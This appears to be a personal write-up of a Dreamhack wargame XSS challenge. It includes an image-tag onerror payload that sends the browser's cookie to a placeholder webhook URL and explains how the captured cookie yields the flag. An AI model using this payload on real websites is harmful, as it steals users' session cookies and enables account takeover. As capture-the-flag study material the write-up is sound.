---
created: 2026-10-12
tags:
  - note
  - journal
  - dreamhack
  - webhook
  - xss
  - cyberStuff
  - cyber
title: xss-2
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-10-12T10:54:49.879Z
---
[link](https://dreamhack.io/wargame/challenges/268)\
desc :\
This is a service where bots that check multiple functions and entered URLs are implemented.\
Use XSS vulnerabilities to obtain flags. The flag is in the flag.txt, FLAG variable.

```
The flag format is DH{...} Is.

Problem fix history
2023.07.12 CSS, html provision and part of read_url() code have been changed.
```

any basic xss payload we use will generate a "good" message , the system is trained to receive them\
![](/images/blog-ul-meu/static/Pasted%20image%2020261012062645.png)\
we have to try something much more complex like using a [webhook](https://webhook.site)\
the payload we will use :

```
<img src=x onerror=this.src='<YOUR_WEBHOOK_URL>'+document.cookie;>
```

what will happen is the server will try to load the image x , but the image does note exist, so it will load the our webhook and send the flag cookie to it

also the message changed\
![](/images/blog-ul-meu/static/Pasted%20image%2020261012064428.png)\
and checking the webhook we find the flag\
![](/images/blog-ul-meu/static/Pasted%20image%2020261012064803.png)
